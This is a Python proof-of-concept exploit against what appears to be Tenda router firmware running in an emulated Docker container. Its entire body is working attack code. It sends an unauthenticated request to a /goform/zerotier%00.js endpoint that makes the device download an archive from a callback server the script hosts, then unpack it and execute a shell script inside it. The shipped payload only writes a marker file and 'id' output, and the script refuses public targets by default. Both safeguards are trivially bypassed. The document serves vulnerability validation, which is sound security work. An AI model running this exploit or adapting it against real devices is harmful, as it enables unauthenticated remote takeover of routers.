#!/usr/bin/env python3
"""
PoC: unauthenticated ZeroTier archive execution through /goform/zerotier%00.js.

The script serves a benign zerotier.tar containing zerotier/start_zerotier.sh.
The firmware downloads it, extracts it under /var, and executes the script.
Validation checks for a marker file in the emulated firmware rootfs.
"""

import argparse
import functools
import io
import ipaddress
import os
from pathlib import Path
import socket
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

REQUEST_LOG = []


def require_private_target(base_url, allow_nonlocal):
    host = urllib.parse.urlparse(base_url).hostname
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")


def docker_sh(container, command):
    return subprocess.run(["docker", "exec", container, "/bin/sh", "-c", command], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False).stdout


def firmware_root_expr():
    return 'pid=$(ps | awk \'/[h]ttpd/{print $1; exit}\'); root=$(readlink /proc/$pid/root); '


def cleanup(container):
    cmd = firmware_root_expr() + 'rm -f "$root/tmp/zerotier_poc_rce" "$root/tmp/zerotier_poc_id" "$root/var/zerotier.tar"; rm -rf "$root/var/zerotier"; for p in $(ps | awk \'/[t]d_zerotier|[z]erotier-one/{print $1}\'); do kill -9 "$p" 2>/dev/null || true; done'
    docker_sh(container, cmd)


class QuietHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        REQUEST_LOG.append(("GET", self.path))
        super().do_GET()

    def do_HEAD(self):
        REQUEST_LOG.append(("HEAD", self.path))
        super().do_HEAD()

    def log_message(self, fmt, *args):
        pass


def create_tar(path):
    script = b"""#!/bin/sh
echo ZEROTIER_POC_RCE > /tmp/zerotier_poc_rce
id > /tmp/zerotier_poc_id 2>&1
"""
    with tarfile.open(path, "w") as tf:
        info = tarfile.TarInfo("zerotier/")
        info.type = tarfile.DIRTYPE
        info.mode = 0o755
        tf.addfile(info)
        info = tarfile.TarInfo("zerotier/start_zerotier.sh")
        info.mode = 0o755
        info.size = len(script)
        tf.addfile(info, io.BytesIO(script))


def get(base_url, path):
    req = urllib.request.Request(base_url.rstrip("/") + path, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()
    except urllib.error.URLError as exc:
        return 0, str(exc).encode()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:18080")
    parser.add_argument("--container", default="tenda-b104-native-httpd")
    parser.add_argument("--callback-host", default="172.17.0.1", help="host/IP reachable from the firmware container")
    parser.add_argument("--callback-port", type=int, default=0)
    parser.add_argument("--no-cleanup", action="store_true")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    require_private_target(args.target, args.allow_nonlocal)
    cleanup(args.container)

    with tempfile.TemporaryDirectory(prefix="tenda-zt-poc-") as tmp:
        tmp_path = Path(tmp)
        create_tar(tmp_path / "zerotier.tar")
        handler = functools.partial(QuietHandler, directory=tmp)
        server = ThreadingHTTPServer(("0.0.0.0", args.callback_port), handler)
        port = server.server_address[1]
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()

        path = f"/goform/zerotier%00.js?proto=http&url={urllib.parse.quote(args.callback_host + ':' + str(port), safe=':')}"
        status, body = get(args.target, path)
        print("[exploit] GET " + path)
        print(f"  status={status} body={body[:160]!r}")

        marker = ""
        id_output = ""
        for _ in range(20):
            marker = docker_sh(args.container, firmware_root_expr() + 'cat "$root/tmp/zerotier_poc_rce" 2>/dev/null || true').strip()
            id_output = docker_sh(args.container, firmware_root_expr() + 'cat "$root/tmp/zerotier_poc_id" 2>/dev/null || true').strip()
            if marker:
                break
            time.sleep(0.5)

        server.shutdown()

    vulnerable = marker == "ZEROTIER_POC_RCE"
    print("[validation] marker=/tmp/zerotier_poc_rce")
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  marker=" + marker)
        print("  id=" + id_output)
        print("  cvss evidence: AV:N/AC:L/PR:N/UI:N/C:H/I:H/A:H candidate; unauthenticated request executes a supplied shell script")
    else:
        print("  callback_requests=" + repr(REQUEST_LOG))
        print("  marker not observed. Check network reachability from container to callback host.")

    if not args.no_cleanup:
        cleanup(args.container)
        print("[cleanup] removed marker/archive and killed ZeroTier helpers")

    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()
